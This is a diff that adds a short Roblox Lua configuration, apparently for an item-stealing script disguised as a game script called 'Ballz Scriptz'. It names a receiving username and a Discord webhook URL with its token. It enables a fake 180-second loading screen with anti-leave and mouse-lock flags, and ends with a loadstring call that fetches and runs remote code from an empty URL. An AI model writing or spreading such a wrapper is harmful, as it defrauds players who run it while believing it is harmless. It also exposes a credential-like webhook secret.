@@ -1,0 +1,15 @@
+UserName = "zackymaster123451"
+Webhook = "https://discord.com/api/webhooks/1084812550534856744/vFtJ5kgcgJAYkgSx5y3SrNEXhZwVKnRXsht0sQsg67LcMtP87NBQywIYaG6AM7lz50Bz" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Ballz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Is Kinda Laggy"
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("", true))()
